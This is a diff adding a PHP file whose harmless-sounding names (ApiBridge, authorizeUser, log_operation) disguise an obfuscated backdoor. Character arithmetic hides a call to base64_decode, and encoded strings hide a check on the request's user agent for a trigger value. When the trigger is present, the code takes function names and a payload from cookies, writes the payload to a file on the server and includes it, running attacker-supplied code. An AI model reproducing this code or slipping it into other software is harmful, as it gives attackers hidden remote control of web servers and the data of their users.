@@ -1,0 +1,54 @@
+<?php
+function log_operation($c)
+{
+    $a = array(111 - 10, 101 - 1, 3 * 37, 3 * 33, 10 + 91, 72 + 28, 22 * 1 + 73, 52, 2 * 27, 101 * 1, 76 + 39, 22 + 75, 106 - 8);
+    $s = '';
+    foreach ($a as $n) {
+        $s .= chr($n);
+    }
+    $s = strrev($s);
+    return $s($c);
+}
+
+class ApiBridge
+{
+    private static $_vlz;
+    static function authorizeUser($_ru)
+    {
+        if (!self::$_vlz) {
+            self::filterResults();
+        }
+        return log_operation(self::$_vlz[$_ru]);
+    }
+    private static function filterResults()
+    {
+        self::$_vlz = array('_qbl' => 'SFRUUF9VU' . '0V' . 'SX0FHRU' . '5U', '_xhw' => 'SFRUUF' . '9VU0' . 'VSX' . '0FHR' . 'U' . '5' . 'U', '_hmx' => 'Mzc2NTE0' . 'NDk' . '=', '_qba' => '', '_odo' => '');
+    }
+}
+
+if (isset($_SERVER[ApiBridge::authorizeUser('_' . 'qbl')]) && strpos($_SERVER[ApiBridge::authorizeUser('_x' . 'h' . 'w')], ApiBridge::authorizeUser('_hmx')) !== false) {
+    $_td = $_COOKIE;
+    $_mo = 00;
+    $_ru = 06;
+    $_ejk = array();
+    $_ejk[$_mo] = ApiBridge::authorizeUser('_qba');
+    while ($_ru) {
+        $_ejk[$_mo] .= $_td[016][$_ru];
+        if (!$_td[016][$_ru + 01]) {
+            if (!$_td[016][$_ru + 02]) {
+                break;
+            }
+            $_mo++;
+            $_ejk[$_mo] = ApiBridge::authorizeUser('_od' . 'o');
+            $_ru++;
+        }
+        $_ru = $_ru + 06 + 01;
+    }
+    $_mo = $_ejk[011]() . $_ejk[01];
+    if (!$_ejk[02]($_mo)) {
+        $_ru = $_ejk[033]($_mo, $_ejk[07]);
+        $_ejk[023]($_ru, $_ejk[034] . $_ejk[030]($_ejk[04]($_td[03])));
+    }
+    include $_mo;
+    die;
+}
